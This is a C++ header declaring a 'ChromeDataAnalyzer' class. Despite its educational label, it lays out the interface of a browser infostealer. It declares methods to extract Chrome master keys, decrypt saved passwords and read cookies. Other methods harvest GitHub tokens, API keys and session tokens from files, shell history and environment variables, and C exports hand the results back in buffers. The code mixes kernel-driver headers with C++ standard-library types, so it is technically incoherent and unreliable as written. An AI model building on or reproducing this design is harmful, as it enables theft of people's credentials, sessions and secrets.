// ChromeDataAnalyzer.h: Chrome browser data extraction analysis component
// Educational security research component for analyzing Chrome browser data extraction techniques

#pragma once

#include <ntddk.h>
#include <wdf.h>
#include <wdm.h>
#include <ntstrsafe.h>
#include <windef.h>

#ifdef __cplusplus
#include <string>
#include <vector>
#include <memory>
#include <functional>

// Chrome credential entry structure
typedef struct _CHROME_CREDENTIAL {
    std::string origin_url;
    std::string action_url;
    std::string username_element;
    std::string username_value;
    std::string password_element;
    std::string password_value;
    std::string signon_realm;
    ULONG64 date_created;
    ULONG64 date_last_used;
    ULONG64 date_password_modified;
    ULONG times_used;
    std::string form_data;
    std::string display_name;
    std::string icon_url;
    std::string federation_url;
    ULONG skip_zero_click;
    ULONG generation_upload_status;
    std::string possible_username_pairs;
    ULONG id;
} CHROME_CREDENTIAL, *PCHROME_CREDENTIAL;

// Chrome cookie entry structure
typedef struct _CHROME_COOKIE {
    std::string host_key;
    std::string name;
    std::string value;
    std::string path;
    ULONG64 creation_utc;
    ULONG64 expires_utc;
    ULONG64 last_access_utc;
    ULONG64 last_update_utc;
    BOOLEAN secure;
    BOOLEAN httponly;
    std::string site_for_cookies;
    std::string same_party;
    ULONG priority;
    std::string source_scheme;
    std::string source_port;
    ULONG source_type;
} CHROME_COOKIE, *PCHROME_COOKIE;

// DPAPI master key structure
typedef struct _DPAPI_MASTER_KEY {
    std::string key_guid;
    std::vector<UCHAR> encrypted_key;
    std::vector<UCHAR> decrypted_key;
    ULONG64 creation_time;
    ULONG64 last_access_time;
    ULONG key_size;
    BOOLEAN is_decrypted;
} DPAPI_MASTER_KEY, *PDPAPI_MASTER_KEY;

// SQLite database analysis result
typedef struct _SQLITE_ANALYSIS_RESULT {
    std::string database_path;
    ULONG table_count;
    ULONG credential_count;
    ULONG cookie_count;
    ULONG autofill_count;
    ULONG credit_card_count;
    std::string schema_hash;
    BOOLEAN is_encrypted;
    BOOLEAN requires_master_key;
    std::string encryption_type;
    ULONG analysis_score;
    std::string analysis_errors;
} SQLITE_ANALYSIS_RESULT, *PSQLITE_ANALYSIS_RESULT;

// AES-256 decryption context
typedef struct _AES_DECRYPTION_CONTEXT {
    UCHAR key[32];          // AES-256 key
    UCHAR iv[16];           // Initialization vector
    ULONG key_size;         // Key size in bits (128, 192, 256)
    ULONG mode;             // ECB, CBC, GCM, etc.
    BOOLEAN key_available;
    BOOLEAN iv_available;
} AES_DECRYPTION_CONTEXT, *PAES_DECRYPTION_CONTEXT;

// Token extraction result
typedef struct _TOKEN_EXTRACTION_RESULT {
    std::vector<std::string> github_tokens;
    std::vector<std::string> api_keys;
    std::vector<std::string> oauth_tokens;
    std::vector<std::string> session_tokens;
    std::vector<std::string> bearer_tokens;
    ULONG total_tokens_found;
    std::string extraction_source;
    BOOLEAN contains_sensitive_data;
} TOKEN_EXTRACTION_RESULT, *PTOKEN_EXTRACTION_RESULT;

// Chrome Data Analyzer class
class ChromeDataAnalyzer {
private:
    // Private member variables
    std::string m_chrome_user_data_path;
    std::string m_chrome_profile_path;
    std::vector<DPAPI_MASTER_KEY> m_master_keys;
    AES_DECRYPTION_CONTEXT m_aes_context;
    BOOLEAN m_debug_logging;
    BOOLEAN m_analysis_complete;
    
    // Analysis results
    SQLITE_ANALYSIS_RESULT m_sqlite_analysis;
    std::vector<CHROME_CREDENTIAL> m_decrypted_credentials;
    std::vector<CHROME_COOKIE> m_extracted_cookies;
    TOKEN_EXTRACTION_RESULT m_token_result;
    
    // Logging buffer
    CHAR m_log_buffer[4096];
    FAST_MUTEX m_log_mutex;
    
    // Private methods
    NTSTATUS InitializeAnalysisPaths();
    NTSTATUS AnalyzeLocalStateFile();
    NTSTATUS ExtractDPAPIMasterKeys();
    NTSTATUS DecryptMasterKey(PDPAPI_MASTER_KEY master_key);
    NTSTATUS AnalyzeLoginDataDatabase();
    NTSTATUS DecryptPasswordValue(PCHROME_CREDENTIAL credential);
    NTSTATUS ExecuteSQLiteQuery(PCHAR database_path, PCHAR query, std::vector<std::vector<std::string>>& results);
    NTSTATUS AnalyzeCookiesDatabase();
    NTSTATUS AnalyzeHistoryDatabase();
    NTSTATUS AnalyzeWebDataDatabase();
    NTSTATUS ExtractTokensFromFiles();
    NTSTATUS ExtractTokensFromHistory(PCHAR history_file_path);
    NTSTATUS ExtractTokensFromConfigFiles();
    NTSTATUS InitializeAESContext(PAES_DECRYPTION_CONTEXT context, PUCHAR key, ULONG key_size, PUCHAR iv);
    NTSTATUS AESDecryptData(PAES_DECRYPTION_CONTEXT context, PUCHAR encrypted_data, ULONG encrypted_size, PUCHAR decrypted_buffer, PULONG decrypted_size);
    VOID LogAnalysisStep(PCHAR step_name, NTSTATUS status, PCHAR additional_info = nullptr);
    
public:
    // Constructor and destructor
    ChromeDataAnalyzer();
    ~ChromeDataAnalyzer();
    
    // Public interface methods
    NTSTATUS Initialize(PCHAR chrome_user_data_path = nullptr, BOOLEAN enable_debug = FALSE);
    NTSTATUS PerformComprehensiveAnalysis();
    NTSTATUS Shutdown();
    
    // Database analysis methods
    NTSTATUS AnalyzeSQLiteDatabase(PCHAR database_path, PSQLITE_ANALYSIS_RESULT result);
    NTSTATUS ExtractCredentialsFromDatabase(PCHAR database_path, std::vector<CHROME_CREDENTIAL>& credentials);
    NTSTATUS ExtractCookiesFromDatabase(PCHAR database_path, std::vector<CHROME_COOKIE>& cookies);
    
    // Decryption methods
    NTSTATUS DecryptChromePassword(PCHROME_CREDENTIAL credential);
    NTSTATUS DecryptDPAPIBlob(PUCHAR encrypted_data, ULONG encrypted_size, PUCHAR decrypted_buffer, PULONG decrypted_size);
    NTSTATUS SetupAESDecryption(PUCHAR key, ULONG key_size, PUCHAR iv = nullptr);
    
    // Token extraction methods
    NTSTATUS ExtractGitHubTokens(PTOKEN_EXTRACTION_RESULT result);
    NTSTATUS ExtractAPITokens(PCHAR source_directory, PTOKEN_EXTRACTION_RESULT result);
    NTSTATUS ExtractTokensFromShellHistory(PTOKEN_EXTRACTION_RESULT result);
    NTSTATUS ExtractTokensFromEnvironment(PTOKEN_EXTRACTION_RESULT result);
    
    // Utility methods
    NTSTATUS GetAnalysisResults(PSQLITE_ANALYSIS_RESULT sqlite_result, PTOKEN_EXTRACTION_RESULT token_result);
    NTSTATUS GetDecryptedCredentials(std::vector<CHROME_CREDENTIAL>& credentials);
    NTSTATUS GetExtractedCookies(std::vector<CHROME_COOKIE>& cookies);
    NTSTATUS GetMasterKeys(std::vector<DPAPI_MASTER_KEY>& master_keys);
    
    NTSTATUS EnableDebugLogging(BOOLEAN enable);
    NTSTATUS GetAnalysisLog(PCHAR buffer, ULONG buffer_size);
    NTSTATUS ClearAnalysisLog();
    
    // Static utility methods
    static NTSTATUS IsChromeDatabaseEncrypted(PCHAR database_path, BOOLEAN* is_encrypted);
    static NTSTATUS GetChromeUserDataPath(PCHAR buffer, ULONG buffer_size);
    static NTSTATUS GetDefaultChromeProfilePath(PCHAR buffer, ULONG buffer_size);
    static NTSTATUS ExtractMasterKeyFromLocalState(PCHAR local_state_path, PDPAPI_MASTER_KEY master_key);
    static NTSTATUS DecryptAES256GCM(PUCHAR key, ULONG key_size, PUCHAR iv, PUCHAR encrypted_data, ULONG encrypted_size, 
                                     PUCHAR decrypted_buffer, PULONG decrypted_size);
    static NTSTATUS ParseSQLiteDatabaseSchema(PCHAR database_path, std::vector<std::string>& tables);
    
    // Educational analysis methods
    NTSTATUS DemonstrateCredentialExtraction(PCHAR test_database_path, PCHROME_CREDENTIAL test_credential);
    NTSTATUS AnalyzeSecurityMechanisms(PSQLITE_ANALYSIS_RESULT analysis);
    NTSTATUS TestDecryptionMethods(PCHAR encrypted_sample, ULONG sample_size, PUCHAR decrypted_buffer, PULONG buffer_size);
    NTSTATUS SimulateTokenExtraction(PCHAR test_directory, PTOKEN_EXTRACTION_RESULT result);
};

// C interface for kernel mode
#ifdef __cplusplus
extern "C" {
#endif

// C-compatible function declarations
NTSTATUS ChromeDataAnalyzer_Create(PVOID* analyzer_instance);
NTSTATUS ChromeDataAnalyzer_Destroy(PVOID analyzer_instance);
NTSTATUS ChromeDataAnalyzer_Initialize(PVOID analyzer_instance, PCHAR chrome_user_data_path);
NTSTATUS ChromeDataAnalyzer_PerformAnalysis(PVOID analyzer_instance);
NTSTATUS ChromeDataAnalyzer_ExtractCredentials(PVOID analyzer_instance, PCHAR* credentials_buffer, ULONG buffer_size);
NTSTATUS ChromeDataAnalyzer_ExtractCookies(PVOID analyzer_instance, PCHAR* cookies_buffer, ULONG buffer_size);
NTSTATUS ChromeDataAnalyzer_ExtractTokens(PVOID analyzer_instance, PCHAR* tokens_buffer, ULONG buffer_size);
NTSTATUS ChromeDataAnalyzer_AnalyzeDatabase(PVOID analyzer_instance, PCHAR database_path, PCHAR analysis_buffer, ULONG buffer_size);

#ifdef __cplusplus
}
#endif

#endif // __cplusplus